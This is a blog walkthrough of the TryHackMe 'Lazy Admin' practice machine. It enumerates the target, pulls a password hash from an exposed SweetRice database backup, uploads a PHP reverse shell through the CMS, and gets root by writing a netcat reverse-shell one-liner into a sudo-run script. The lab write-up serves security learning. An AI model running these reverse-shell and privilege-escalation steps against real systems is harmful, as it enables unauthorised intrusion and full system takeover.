---
layout: post
permalink: /posts/thm/lazy-admin
title: "Lazy Admin"
---

Easy linux machine to practice your skills<br/>

Okay, let's start our enumeration with nmap scan

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/lazy-admin/nmap.png)

There are two open ports, 22 SSH and 80 HTTP. Go and visit the website.

![website](/assets/images/thm/lazy-admin/website.png)

It's Apache landing page. Let's scan for hidden directories with gobuster.

```
gobuster dir -u http://10.10.60.134/ -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/images/thm/lazy-admin/gobuster.png)

We have found a directory `content`. It's CMS system called SweetRice. 

![content](/assets/images/thm/lazy-admin/content.png)

I searched for any known vulnerabilities in <https://www.exploit-db.com/> but wasn't sure which of the could help.

![exploit-db](/assets/images/thm/lazy-admin/exploit-db.png)

Let's scan this subdirectory.

```
gobuster dir -u http://10.10.60.134/content -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![gobuster-content](/assets/images/thm/lazy-admin/gobuster-content.png)

One of the CVE reports is related with the `inc` directories where we'll be able to download the mysql backup. Go and visit this directory.

![mysql-backup](/assets/images/thm/lazy-admin/mysql-backup.png)

Download the mysql backup and see whether we'll be able to find any useful information

![sql](/assets/images/thm/lazy-admin/sql.png)

If you look closely you will find username `manager` with hash `42f749ade7f9e195bf475f37a44cafcb` <br/>

I'm going to use <https://crackstation.net/> to crack the password.

![crack](/assets/images/thm/lazy-admin/crack.png)

Good, now we have credentials. Go to `as` subdirectory and try to login.

![as](/assets/images/thm/lazy-admin/as.png)

![welcome](/assets/images/thm/lazy-admin/welcome.png)

Nice, I went back to the exploit db and looked for the apropriate exploit. It's <https://www.exploit-db.com/exploits/40700>. Now from left side menu navigate to Ads. There we'll paste our reverse php code <https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php> this is a good one. Dont forget to set your ip and port

![ads](/assets/images/thm/lazy-admin/ads.png)

Press done button and start a listener on your machine.

```
nc -lvnp 4444
```

Navigate to `<IP>/content/inc/ads/<YOUR_REVERSE_SHELL_FILE_NAME>`

![shell](/assets/images/thm/lazy-admin/shell.png)

Good. Look around the system and find the user flag. <br/>

The last thing that we have to do is to escalate our privileges. Let's check whether we are able to execute any commands as root

```
sudo -l
```

![sudo-l](/assets/images/thm/lazy-admin/sudo-l.png)

Let's see what is backup.pl

![backup](/assets/images/thm/lazy-admin/backup.png)

It executes a `copy.sh`

![copy](/assets/images/thm/lazy-admin/copy.png)

It looks that we already have the reverese shell we just need to change the ip

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 5554 >/tmp/f" > /etc/copy.sh
```

start netcat listener 

```
nc -lvnp 5554
```

and execute the script

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

![root](/assets/images/thm/lazy-admin/root.png)

Nice, we were able to get root access. Now just find the root flag.
